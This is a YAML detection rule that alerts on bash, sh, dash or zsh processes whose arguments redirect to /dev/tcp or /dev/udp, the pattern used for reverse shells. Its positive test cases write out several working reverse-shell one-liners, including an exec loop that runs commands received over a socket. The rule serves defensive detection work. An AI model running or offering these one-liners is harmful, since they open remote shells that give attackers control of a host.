name: rta_bash_dev_tcp_reverse_shell
mode: alert
eval: |
  (
    (e.process_name == "bash" || e.process_name == "sh" || e.process_name == "dash" || e.process_name == "zsh") &&
    re_match(e.process_args, "/dev/(tcp|udp)/[0-9.]+/[0-9]+")
  )
tests:
  - cleartext: "bash -i reverse shell to /dev/tcp"
    process_name: bash
    process_args: "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
    should_match: true
  - cleartext: "sh reverse shell UDP"
    process_name: sh
    process_args: "sh -i >& /dev/udp/192.168.1.100/5555 0>&1"
    should_match: true
  - cleartext: "bash file descriptor redirect to /dev/tcp"
    process_name: bash
    process_args: "bash -i 5<> /dev/tcp/10.0.0.1/8080 0<&5 1>&5 2>&5"
    should_match: true
  - cleartext: "bash exec with /dev/tcp"
    process_name: bash
    process_args: "exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"
    should_match: true
  - cleartext: "normal bash script execution"
    process_name: bash
    process_args: "bash script.sh"
    should_match: false
  - cleartext: "bash reading from /dev/null"
    process_name: bash
    process_args: "bash -c 'cat /dev/null'"
    should_match: false
